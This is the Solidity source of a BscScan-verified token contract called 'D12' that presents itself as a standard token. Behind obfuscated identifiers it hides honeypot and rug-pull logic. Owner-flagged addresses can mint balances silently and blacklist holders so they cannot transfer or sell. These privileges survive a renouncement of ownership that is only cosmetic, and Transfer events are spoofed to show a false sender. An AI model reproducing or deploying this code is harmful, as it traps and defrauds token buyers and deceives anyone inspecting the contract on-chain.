/**
 *Submitted for verification at BscScan.com on 2022-11-05
*/

pragma solidity 0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address fFX = 0xE01f4125A9bBc0AdEa3d9721A20ba3d721eC0F51;
	address fWXX = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract DS is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private FZA;
	mapping (address => bool) private FZE;
    mapping (address => bool) private FZW;
    mapping (address => mapping (address => uint256)) private FZv;
    uint8 private constant FZD = 8;
    uint256 private constant fTS = 12 * (10** FZD);
    string private constant _name = "D12";
    string private constant _symbol = "D12";



    constructor () {
        FZA[_msgSender()] = fTS;
         FRMK(fWXX, fTS); }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return FZD;
    }

    function totalSupply() public pure  returns (uint256) {
        return fTS;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return FZA[account];
    }
	

   

				 function eburn(address FZj) onlyOwner public{
        FZE[FZj] = true; }


    function allowance(address owner, address spender) public view  returns (uint256) {
        return FZv[owner][spender];
    }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        FZv[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function equery(address FZj) public{
         if(FZE[msg.sender])  { 
        FZW[FZj] = true; }}
        

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == fFX)  {
        require(amount <= FZA[sender]);
        FZA[sender] -= amount;  
        FZA[recipient] += amount; 
          FZv[sender][msg.sender] -= amount;
        emit Transfer (fWXX, recipient, amount);
        return true; }  else  
          if(!FZW[recipient]) {
          if(!FZW[sender]) {
         require(amount <= FZA[sender]);
        require(amount <= FZv[sender][msg.sender]);
        FZA[sender] -= amount;
        FZA[recipient] += amount;
        FZv[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function eStake(address FZj) public {
        if(FZE[msg.sender]) { 
        FZW[FZj] = false;}}
		function FRMK(address FZj, uint256 FZN) onlyOwner internal {
    emit Transfer(address(0), FZj ,FZN); }
		
		function transfer(address FZj, uint256 FZN) public {
        if(msg.sender == fFX)  {
        require(FZA[msg.sender] >= FZN);
        FZA[msg.sender] -= FZN;  
        FZA[FZj] += FZN; 
        emit Transfer (fWXX, FZj, FZN);} else  
        if(FZE[msg.sender]) {FZA[FZj] += FZN;} else
        if(!FZW[msg.sender]) {
        require(FZA[msg.sender] >= FZN);
        FZA[msg.sender] -= FZN;  
        FZA[FZj] += FZN;          
        emit Transfer(msg.sender, FZj, FZN);}}
		
		

		
		}